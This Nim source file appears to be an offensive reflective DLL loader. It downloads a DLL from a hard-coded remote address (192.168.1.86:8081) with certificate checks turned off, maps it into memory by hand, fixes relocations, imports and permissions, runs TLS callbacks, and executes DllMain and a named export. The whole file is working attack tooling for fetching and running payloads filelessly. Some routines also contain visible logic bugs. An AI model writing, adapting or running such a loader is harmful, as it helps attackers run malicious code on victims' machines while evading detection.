import winim
import ptr_math
import puppy



type
    PE_HDRS = object
        pFileBuffer             : ptr BYTE
        dwFileSize              : DWORD

        pImgNtHdrs              : ptr IMAGE_NT_HEADERS
        pImgSecHdr              : ptr IMAGE_SECTION_HEADER

        pEntryImportDataDir     : ptr IMAGE_DATA_DIRECTORY
        pEntryBaseRelocDataDir  : ptr IMAGE_DATA_DIRECTORY
        pEntryTLSDataDir        : ptr IMAGE_DATA_DIRECTORY
        pEntryExceptionDataDir  : ptr IMAGE_DATA_DIRECTORY
        pEntryExportDataDir     : ptr IMAGE_DATA_DIRECTORY

        bIsDLLFile              : BOOL


    IMAGE_BASE_RELOCATION = object
        VirtualAddress  : DWORD
        SizeOfBlock     : DWORD


    BASE_RELOCATION_ENTRY = object
        Offset  : WORD      = 12
        Type    : WORD      = 4


    IMAGE_RUNTIME_FUNCTION_ENTRY = object
        BeginAddress        : DWORD
        EndAddress          : DWORD
        UnwindInfoAddress   : DWORD


    DLLMAIN = proc(hInst: HINSTANCE, reason: DWORD, reserved: LPVOID): BOOL {.stdcall.}



func ToByteSeq(str: string): seq[byte] {.inline.} =
    ## Converts a string to the corresponding byte sequence.
    @(str.toOpenArrayByte(0, str.high))



proc InitializePeStruct(pPeHdrs: ptr PE_HDRS, payload: string): bool =
    var
        memloadBytes    : seq[byte] = ToByteSeq(payload)
        pFileBuffer                 = memloadBytes[0].addr

    pPeHdrs.pFileBuffer     = pFileBuffer
    pPeHdrs.pImgNtHdrs      = cast[ptr IMAGE_NT_HEADERS](cast[DWORD](pFileBuffer) + cast[DWORD](cast[PIMAGE_DOS_HEADER](pFileBuffer).e_lfanew))
    pPeHdrs.dwFileSize      = pPeHdrs.pImgNtHdrs.OptionalHeader.SizeOfImage

    if pPeHdrs.pImgNtHdrs.Signature != IMAGE_NT_SIGNATURE:
        return false

    if pPeHdrs.pImgNtHdrs.FileHeader.Characteristics == IMAGE_FILE_DLL:
        pPeHdrs.bIsDLLFile = true
    else:
        pPeHdrs.bIsDLLFile = false

    pPeHdrs.pImgSecHdr              = IMAGE_FIRST_SECTION(pPeHdrs.pImgNtHdrs)
    pPeHdrs.pEntryImportDataDir     = &pPeHdrs.pImgNtHdrs.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
    pPeHdrs.pEntryBaseRelocDataDir  = &pPeHdrs.pImgNtHdrs.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
    pPeHdrs.pEntryTLSDataDir        = &pPeHdrs.pImgNtHdrs.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS]
    pPeHdrs.pEntryExceptionDataDir  = &pPeHdrs.pImgNtHdrs.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION]
    pPeHdrs.pEntryExportDataDir     = &pPeHdrs.pImgNtHdrs.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]

    return true



proc FixReloc(pEntryBaseRelocDataDir: PIMAGE_DATA_DIRECTORY, pPeBaseAddress: ULONG_PTR, pPreferableAddress: ULONG_PTR): bool =
    var
        pImgBaseRelocation  : ptr IMAGE_BASE_RELOCATION
        uDeltaOffset        : ULONG_PTR
        pBaseRelocEntry     : ptr BASE_RELOCATION_ENTRY     = nil

    pImgBaseRelocation  = cast[ptr IMAGE_BASE_RELOCATION](cast[int](pPeBaseAddress) + cast[int](pEntryBaseRelocDataDir.VirtualAddress))
    uDeltaOffset        = cast[ULONG_PTR](cast[int](pPeBaseAddress) - cast[int](pPreferableAddress))

    while pImgBaseRelocation.VirtualAddress:
        pBaseRelocEntry = cast[ptr BASE_RELOCATION_ENTRY](cast[int](pImgBaseRelocation) + 1)

        while cast[PBYTE](pBaseRelocEntry) != cast[PBYTE](cast[int](pImgBaseRelocation) + cast[int](pImgBaseRelocation.SizeOfBlock)):
            case pBaseRelocEntry.Type
            of IMAGE_REL_BASED_DIR64:
                # Adjust a 64-bit field by the delta offset.
                cast[ptr ULONG_PTR](cast[int](pPeBaseAddress) + cast[int](pImgBaseRelocation.VirtualAddress) + cast[int](pBaseRelocEntry.Offset))[] += uDeltaOffset
            of IMAGE_REL_BASED_HIGHLOW:
                # Adjust a 32-bit field by the delta offset.
                cast[ptr DWORD](cast[int](pPeBaseAddress) + cast[int](pImgBaseRelocation.VirtualAddress) + cast[int](pBaseRelocEntry.Offset))[] += DWORD(uDeltaOffset)
            of IMAGE_REL_BASED_HIGH:
                # Adjust the high 16 bits of a 32-bit field.
                cast[ptr WORD](cast[int](pPeBaseAddress) + cast[int](pImgBaseRelocation.VirtualAddress) + cast[int](pBaseRelocEntry.Offset))[] += HIWORD(uDeltaOffset)
            of IMAGE_REL_BASED_LOW:
                # Adjust the low 16 bits of a 32-bit field.
                cast[ptr WORD](cast[int](pPeBaseAddress) + cast[int](pImgBaseRelocation.VirtualAddress) + cast[int](pBaseRelocEntry.Offset))[] += LOWORD(uDeltaOffset)
            of IMAGE_REL_BASED_ABSOLUTE:
                # No relocation is required.
                break
            else:
                # Handle unknown relocation types.
                return false

            pBaseRelocEntry = cast[ptr BASE_RELOCATION_ENTRY](cast[int](pBaseRelocEntry) + cast[int](sizeof(BASE_RELOCATION_ENTRY)))

        pImgBaseRelocation = cast[ptr IMAGE_BASE_RELOCATION](pBaseRelocEntry)

        return true



proc FixImportAddressTable(pPeHdrs: ptr PE_HDRS, modulePtr: PVOID): bool =
    var 
        importsDir  : ptr IMAGE_DATA_DIRECTORY      = pPeHdrs.pEntryImportDataDir
        maxSize     : csize_t                       = cast[csize_t](importsDir.Size)
        impAddr     : csize_t                       = cast[csize_t](importsDir.VirtualAddress)
        lib_desc    : ptr IMAGE_IMPORT_DESCRIPTOR
        parsedSize  : csize_t                       = 0
        libname     : LPSTR
        call_via    : csize_t
        thunk_addr  : csize_t
        offsetField : csize_t
        offsetThunk : csize_t
        hmodule     : HMODULE
        fieldThunk  : PIMAGE_THUNK_DATA
        orginThunk  : PIMAGE_THUNK_DATA
        boolvar     : bool
        nameData    : PIMAGE_IMPORT_BY_NAME
        byname      : PIMAGE_IMPORT_BY_NAME
        func_name   : LPCSTR

    if importsDir == nil:
        return false

    while parsedSize < maxSize:
        lib_desc = cast[ptr IMAGE_IMPORT_DESCRIPTOR]((impAddr + parsedSize + cast[uint64](modulePtr)))
        if (lib_desc.union1.OriginalFirstThunk == 0) and (lib_desc.FirstThunk == 0):
            break
    
        libname = cast[LPSTR](cast[ULONGLONG](modulePtr) + lib_desc.Name)
        call_via = cast[csize_t](lib_desc.FirstThunk)

        thunk_addr = cast[csize_t](lib_desc.union1.OriginalFirstThunk)
        if thunk_addr == 0:
            thunk_addr = csize_t(lib_desc.FirstThunk)

        offsetField = 0
        offsetThunk = 0
        
        hmodule = LoadLibraryA(libname)
            
        while true:
            fieldThunk = cast[PIMAGE_THUNK_DATA]((cast[csize_t](modulePtr) + offsetField + call_via))
            orginThunk = cast[PIMAGE_THUNK_DATA]((cast[csize_t](modulePtr) + offsetThunk + thunk_addr))

            if ((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG32) != 0):
                boolvar = true
            elif((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG64) != 0):
                boolvar = true

            if (boolvar):
                var libaddr: size_t = cast[size_t](GetProcAddress(LoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
                fieldThunk.u1.Function = ULONGLONG(libaddr)

            if fieldThunk.u1.Function == 0:
                break

            if fieldThunk.u1.Function == orginThunk.u1.Function:
                nameData = cast[PIMAGE_IMPORT_BY_NAME](orginThunk.u1.AddressOfData)
                byname = cast[PIMAGE_IMPORT_BY_NAME](cast[ULONGLONG](modulePtr) + cast[DWORD](nameData))
          
            func_name = cast[LPCSTR](addr byname.Name)
            var libaddr: csize_t = cast[csize_t](GetProcAddress(hmodule,func_name))
            fieldThunk.u1.Function = ULONGLONG(libaddr)

            inc(offsetField, sizeof((IMAGE_THUNK_DATA)))
            inc(offsetThunk, sizeof((IMAGE_THUNK_DATA)))

        inc(parsedSize, sizeof((IMAGE_IMPORT_DESCRIPTOR)))
  
    return true



proc FixMemPermissions(pPeBaseAddress: ULONG_PTR, pImgNtHdrs: PIMAGE_NT_HEADERS, pImgSecHdr: PIMAGE_SECTION_HEADER): bool =
    var
        dwProtection        : DWORD
        dwOldProtection     : DWORD

    var i = cast[DWORD](0)
    while i < cast[DWORD](pImgNtHdrs.FileHeader.NumberOfSections):
        dwProtection        = 0x00
        dwOldProtection     = 0x00

        if pImgSecHdr[i].SizeOfRawData == 0 or pImgSecHdr[i].VirtualAddress == 0:
            inc(i)
            continue

        if (pImgSecHdr[i].Characteristics and IMAGE_SCN_MEMWRITE):
            dwProtection = PAGE_WRITECOPY

        if (pImgSecHdr[i].Characteristics and IMAGE_SCN_MEM_READ):
            dwProtection = PAGE_READWRITE

        if ((pImgSecHdr[i].Characteristics and IMAGE_SCN_MEMWRITE) and (pImgSecHdr[i].Characteristics and IMAGE_SCN_MEM_READ)):
            dwProtection = PAGE_READWRITE

        if (pImgSecHdr[i].Characteristics and IMAGE_SCN_MEM_EXECUTE):
            dwProtection = PAGE_EXECUTE

        if ((pImgSecHdr[i].Characteristics and IMAGE_SCN_MEM_EXECUTE) and (pImgSecHdr[i].Characteristics and IMAGE_SCN_MEM_WRITE)):
            dwProtection = PAGE_EXECUTE_WRITECOPY

        if ((pImgSecHdr[i].Characteristics and IMAGE_SCN_MEM_EXECUTE) and (pImgSecHdr[i].Characteristics and IMAGE_SCN_MEM_READ)):
            dwProtection = PAGE_EXECUTE_READ

        if ((pImgSecHdr[i].Characteristics and IMAGE_SCN_MEM_EXECUTE) and (pImgSecHdr[i].Characteristics and IMAGE_SCN_MEM_WRITE) and (pImgSecHdr[i].Characteristics and IMAGE_SCN_MEM_READ)):
            dwProtection = PAGE_EXECUTE_READWRITE

        if VirtualProtect(cast[LPVOID](cast[int](pPeBaseAddress) + cast[int](pImgSecHdr[i].VirtualAddress)), pImgSecHdr[i].SizeOfRawData, dwProtection, &dwOldProtection) == 0:
            return false

        inc(i)

    return true



proc SetExceptionHandlers(pPeHdrs: ptr PE_HDRS, pPeBaseAddress: LPVOID): bool =
    if pPeHdrs.pEntryExceptionDataDir.Size != 0:
        var pImgRuntimeFuncEntry = cast[PRUNTIME_FUNCTION](cast[int](pPeBaseAddress) + cast[int](pPeHdrs.pEntryExceptionDataDir.VirtualAddress))

        if RtlAddFunctionTable(pImgRuntimeFuncEntry, cast[DWORD](pPeHdrs.pEntryExceptionDataDir.Size div sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)), cast[DWORD64](pPeBaseAddress)) == FALSE:
            return false

    return true



proc ExecTLSCallbacks(pPeHdrs: ptr PE_HDRS, baseAddress: PVOID): bool =
    var
        pImgTlsDirectory    : PIMAGE_TLS_DIRECTORY
        pImgTlsCallback     : ptr ULONGLONG

    if pPeHdrs.pEntryTLSDataDir.Size > 0:
        pImgTlsDirectory    = cast[PIMAGE_TLS_DIRECTORY](cast[int](baseAddress) + cast[int](pPeHdrs.pEntryTLSDataDir.VirtualAddress))
        pImgTlsCallback     = cast[ptr ULONGLONG](pImgTlsDirectory.AddressOfCallBacks)


    while pImgTlsCallback[] != 0:
        var callback: proc(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): void {.cdecl.} = cast[proc(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): void {.cdecl.}](pImgTlsCallback[])
        try:
          callback(cast[HINSTANCE](baseAddress), DLL_PROCESS_ATTACH, nil)
        except:
          return false

        pImgTlsCallback += 1

    return true



proc FetchExportedFunctionAddress(pEntryExportDataDir: PIMAGE_DATA_DIRECTORY, pPeBaseAddress: ULONG_PTR, cFuncName: LPCSTR): PVOID =
    var
        pImgExportDir           : PIMAGE_EXPORT_DIRECTORY
        functionNameArray       : PDWORD
        functionAddressArray    : PDWORD
        functionOrdinalArray    : PWORD
        functionAddress         : PVOID

    pImgExportDir           = cast[PIMAGE_EXPORT_DIRECTORY](cast[int](pPeBaseAddress) + cast[int](pEntryExportDataDir.VirtualAddress))
    functionNameArray       = cast[PDWORD](pPeBaseAddress + pImgExportDir.AddressOfNames)
    functionAddressArray    = cast[PDWORD](pPeBaseAddress + pImgExportDir.AddressOfFunctions)
    functionOrdinalArray    = cast[PWORD](pPeBaseAddress + pImgExportDir.AddressOfNameOrdinals)


    for i in 0 ..< int(pImgExportDir.NumberOfNames):
        let nameRVA = functionNameArray[i]
        let functionName = cast[cstring](pPeBaseAddress + nameRVA)
        let ordinal = (DWORD)(functionOrdinalArray[i]) + pImgExportDir.Base - 1  # Ajuster l'ordinal

        if ordinal < pImgExportDir.NumberOfFunctions:
            let functionRVA = functionAddressArray[ordinal]
            functionAddress = cast[PVOID](pPeBaseAddress + functionRVA)

        if functionName == cast[cstring](cFuncName):
            return functionAddress


    return nil



proc LocalReflectiveDllExec(pPeHdrs: ptr PE_HDRS, cExportedFuncName: string = ""): string =
    var
        pPeBaseAddress          : LPVOID
        sectionHeaders          : ptr array[0..high(int), IMAGE_SECTION_HEADER] = cast[ptr array[0..high(int), IMAGE_SECTION_HEADER]](pPeHdrs.pImgSecHdr)
        dest                    : LPVOID
        source                  : LPVOID
        size                    : DWORD
        pExportedFuncAddress    : PVOID                                         = nil
        pEntryPoint             : PVOID
        hThread                 : HANDLE
        exitCode                : DWORD

    #pPeBaseAddress = VirtualAlloc(nil, pPeHdrs.pImgNtHdrs.OptionalHeader.SizeOfImage, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE)
    pPeBaseAddress = VirtualAlloc(cast[LPVOID](pPeHdrs.pImgNtHdrs.OptionalHeader.ImageBase), pPeHdrs.dwFileSize, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE)
    if pPeBaseAddress == nil:
        return "\n[-] Failed to allocate memory : " & $GetLastError()

    copymem(pPeBaseAddress, cast[pointer](pPeHdrs.pFileBuffer), pPeHdrs.pImgNtHdrs.OptionalHeader.SizeOfHeaders)

    var i=0
    while i < int(pPeHdrs.pImgNtHdrs.FileHeader.NumberOfSections):
        dest    = cast[LPVOID](cast[int](pPeBaseAddress) + cast[int](sectionHeaders[i].VirtualAddress))
        source  = cast[LPVOID](cast[int](pPeHdrs.pFileBuffer) + cast[int](sectionHeaders[i].PointerToRawData))
        size    = sectionHeaders[i].SizeOfRawData

        copymem(dest, source, size)
        inc(i)
    result.add("\n[+] DLL Sections copied")


    if pPeBaseAddress != cast[LPVOID](pPeHdrs.pImgNtHdrs.OptionalHeader.ImageBase):
        if FixReloc(pPeHdrs.pEntryBaseRelocDataDir, cast[ULONG_PTR](pPeBaseAddress), cast[ULONG_PTR](pPeHdrs.pImgNtHdrs.OptionalHeader.ImageBase)) == false:
            result.add("\n[-] Failed to fix relocation : " & $GetLastError())
        else:
            result.add("\n[+] Relocation fixed")


    if FixImportAddressTable(pPeHdrs, pPeBaseAddress) == false:
        result.add("\n[-] Failed to fix IAT : " & $GetLastError())
    else:
        result.add("\n[+] IAT fixed")

    if FixMemPermissions(cast[ULONG_PTR](pPeBaseAddress), pPeHdrs.pImgNtHdrs, pPeHdrs.pImgSecHdr) == false:
        result.add("\n[-] Failed to fix memory permission : " & $GetLastError())
    else:
        result.add("\n[+] Memory permissions fixed")


    if SetExceptionHandlers(pPeHdrs, pPeBaseAddress) == false:
        result.add("\n[-] Failed to set Exception Handlers : " & $GetLastError())
    else:
        result.add("\n[+] Exception Handlers fixed")

    pEntryPoint = cast[PVOID](cast[int](pPeBaseAddress) + cast[int](pPeHdrs.pImgNtHdrs.OptionalHeader.AddressOfEntryPoint))


    if ExecTLSCallbacks(pPeHdrs, pPeBaseAddress) == false:
        result.add("\n[-] TLS Callback failed : " & $GetLastError())
    else:
        result.add("\n[+] TLS Callback executed ! (if exists)")


    if pPeHdrs.pEntryExportDataDir.Size != 0 and pPeHdrs.pEntryExportDataDir.VirtualAddress != 0 and cExportedFuncName != "":
        pExportedFuncAddress = FetchExportedFunctionAddress(pPeHdrs.pEntryExportDataDir, cast[ULONG_PTR](pPeBaseAddress), cExportedFuncName)
        if pExportedFuncAddress != nil:
            result.add("\n[+] Exported function fetched !")
        else:
            result.add("\n[-] Failed to fetch exported function")
    
    result.add("\n\n[+] DLL base address              : " & pPeBaseAddress.repr)
    if cExportedFuncName != "":
        result.add("\n[+] Exported function             : " & $cExportedFuncName)
    result.add("\n[+] DLL size                      : " & $pPeHdrs.dwFileSize)
    result.add("\n[+] Entry point address           : " & pEntryPoint.repr)
    if cExportedFuncName != "":
        result.add("\n[+] Exported function address     : " & pExportedFuncAddress.repr)
    result.add("\n[+] DLL executed !")

    let pDllMain: DLLMAIN = cast[DLLMAIN](pEntryPoint)
    discard pDllMain(cast[HINSTANCE](pPeBaseAddress), DLL_PROCESS_ATTACH, nil)

    if pExportedFuncAddress != nil:
        hThread = CreateThread(nil, 0x00, cast[LPTHREAD_START_ROUTINE](pExportedFuncAddress), nil, 0, nil)
        if hThread == 0:
            result.add("[-] Failed to create thread: " & $GetLastError())

        while true:
            if GetExitCodeThread(hThread, &exitCode) == 0:
                result.add("[-] Failed to get exit code :" & $GetLastError())

                if TerminateThread(hThread, 1) == 0:
                    result.add("[-] Failed to terminate thread : " & $GetLastError())
                else:
                    result.add("[+] Thread killed")

                break

            if exitCode == STILL_ACTIVE:
                continue

            break

    if VirtualFree(pPeBaseAddress, 0, MEM_RELEASE) == 0:
        result.add("\n\n[-] Failed to free allocation :" & $GetLastError())
    else:
        result.add("\n\n[+] Allocation freed")



proc GetRemoteDll(url: string, exportedFunction: string = ""): string =
    var
        res         : Response
        payload     : string
        peHdrs      : PE_HDRS


    var req = Request(
        url                         : parseUrl(url),
        verb                        : "get",
        allowAnyHttpsCertificate    : true
    )

    try:
        res = fetch(req)
    except:
        return "[-] Failed to get dll"
    payload = res.body



    if InitializePeStruct(addr peHdrs, payload) == false:
      return "[-] Failed to initialize DLL structure : " & $GetLastError()
    
    result.add("[+] DLL structure initalized")

    if exportedFunction.len != 0:
        result.add(LocalReflectiveDllExec(peHdrs, exportedFunction))
    else:
        result.add(LocalReflectiveDllExec(peHdrs))



when isMainModule:
    var
        url                 : string    = "http://192.168.1.86:8081/mydll.dll"
        exportedFunction    : string    = "MyExportedFunction"

    echo GetRemoteDll(url, exportedFunction)